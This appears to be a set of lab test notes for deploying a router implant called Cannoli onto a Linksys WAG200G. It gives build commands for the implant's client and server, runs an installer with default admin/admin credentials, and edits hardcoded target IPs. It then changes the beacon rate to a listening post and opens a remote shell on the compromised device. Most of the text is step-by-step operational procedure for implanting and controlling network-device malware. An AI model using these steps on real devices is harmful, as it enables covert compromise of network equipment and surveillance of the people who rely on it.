Config steps:


Created DHCPDynamic Host Configuration Protocol space from CoreSW for 172.20.100.248/29
Assigned Linksys WAG200G "LAN" address of 172.20.100.254
LAN VMVirtual Machine client pulled 172.20.100.252 .... connected to LANLocal Area Network port of Linksys
WAN port, DHCPDynamic Host Configuration Protocol turned off on Linksys per CONOP



On Cannoli LP:
Unzipped Cannoli 2.0 zip in: /home/ndb/aquifer/canoli_v2.0.0/
In /bin/ folder, copied the .cfg example file and make a linksys.cfg file with the LPListening Post IP as the #1 LPListening Post (172.20.13.50)
Run the following command to create client & server files: ./CCT ../bin/mips-32-LE-static/client/client mod-client ../bin/mips-32-LE-static/server/server mod-server linksys.cfg

The next step is apparently to use "puppetmon" to put Cannoli onto the target Linksys... unable to find puppetmon utility or any instructions on it... waiting for User #76675 to get back to me.After speaking with User #?... it was determined that puppetmon.py was not going to work to get Cannoli on the Linksys target. When running puppetmon.py it eventually always returns errors. User #? advised that it would only work if the targe twas in the 192.168.x.x space




On LANLocal Area Network VM
Put installer script on LANLocal Area Network VMVirtual Machine in /home/ndb/aquifer/WAG200G
Also scp'd "mod-client" to the same folder above
Ran script as directed in instructions: ./linksys-wag20g-installer.sh mod-client admin admin

Seems to fail since it's looking for 192.168.1.1
Replaced all the 192.168.1.1 fields in the installer.sh with the actual IP on the target of 172.20.100.254

Ran scrip again: /linksys-wag20g-installer.sh mod-client admin adminAfter about 15-20 minutes, the mod-client is uploaded 100% successful





From Cannoli LP:

With the "./mod-server 9000" already running on the LP... implant beacons back with it's source IP of 172.20.100.254 and the two addresses it has in it's table:
LAN VM: 172.20.100.252
Upstream router: 172.20.100.249


Beacon was originally set to beacon every 24 hours... therefore... rebooted target to remove implant. Once rebooted, the above LANLocal Area Network VMVirtual Machine steps were followed again.
On LP... issued the following command to change beacon rate once the target does it's inital beacon back:
./upload.sh beacon_rate_file /tmp.gj4giHWu
Once install comepletes and beacons, it ingests the new command to change the beacon rate to 120 seconds.


Issued "./shell.sh" command after this to get a shell once the target beacons back again.
type "ls" at new shell prompt and the file system on target is seen
native shell commands are available




 

Various testing scenarios
With beacon continueing every two minutes from the previous setup:
Remove gateway on the Linksys to see if Cannoli is still able to find the gateway to beacon out through.... 
Under setup>advanced routing> deleted static routing entry
With static route NOT on the target to the gateway, beacon does NOT return to LP


Added static default route with gateway back on the target LinksysBeacon's have stopped since I surpassed the max fail beacons


Note: Without static route/gateway configured, the LANLocal Area Network hosts still have connectivity to outside networks
